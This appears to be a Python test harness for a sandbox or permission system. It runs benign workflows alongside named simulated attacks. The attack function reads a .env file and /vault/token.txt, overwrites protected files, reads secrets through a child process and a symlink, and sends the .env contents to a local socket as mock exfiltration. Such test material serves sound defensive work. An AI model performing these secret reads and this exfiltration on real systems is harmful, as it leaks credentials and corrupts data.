"""Small real programs and harmful operations with independently checked effects."""
import argparse
import json
import os
from pathlib import Path
import socket
import subprocess
import sys

ROOT = Path("/workspace")


def run(workflow, variant):
    index = variant % 3
    if workflow == "tests":
        code = (ROOT / "src" / f"calc-{index}.py").read_text()
        namespace = {}
        exec(code, namespace)
        assert namespace["add"](2, 3) == 5
        (ROOT / "build" / f"tests-{variant}.json").write_text('{"passed":true}\n')
    elif workflow == "docs":
        source = (ROOT / "docs" / f"guide-{index}.md").read_text()
        (ROOT / "build" / f"docs-{variant}.html").write_text("<p>" + source.strip() + "</p>\n")
    elif workflow == "format":
        path = ROOT / "src" / f"calc-{index}.py"
        path.write_text("\n".join(line.rstrip() for line in path.read_text().splitlines()) + "\n")
    elif workflow == "report":
        data = json.loads((ROOT / "data" / f"batch-{index}.json").read_text())
        (ROOT / "build" / f"report-{variant}.json").write_text(json.dumps({"total": sum(data)}) + "\n")
    elif workflow == "fetch":
        with socket.create_connection(("127.0.0.1", 8765), timeout=2) as connection:
            connection.sendall(b"fetch")
            response = connection.recv(100)
        (ROOT / "build" / f"fetch-{variant}.txt").write_bytes(response)


def attack(name, workflow):
    if name == "secret-read":
        print((ROOT / ".env").read_text())
    elif name == "outside-read":
        print(Path("/vault/token.txt").read_text())
    elif name == "protected-write":
        (ROOT / "private" / "keep.txt").write_text("CORRUPTED")
    elif name == "child-secret-read":
        subprocess.run([sys.executable, "-c", "print(open('/workspace/.env').read())"], check=True)
    elif name == "symlink-read":
        print((ROOT / "data" / "shortcut.json").read_text())
    elif name == "exfiltration":
        secret = (ROOT / ".env").read_bytes()
        with socket.create_connection(("127.0.0.1", 8766), timeout=2) as connection:
            connection.sendall(secret)
    elif name == "allowed-resource-misuse":
        # Permissions cannot determine correctness of writes to allowed objects.
        target = ROOT / "src" / "calc-0.py" if workflow == "format" else ROOT / "build" / "corrupt.txt"
        target.write_text("CORRUPTED")
    else:
        raise ValueError(name)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("workflow")
    parser.add_argument("variant", type=int)
    parser.add_argument("--attack")
    args = parser.parse_args()
    if args.attack:
        attack(args.attack, args.workflow)
    else:
        run(args.workflow, args.variant)
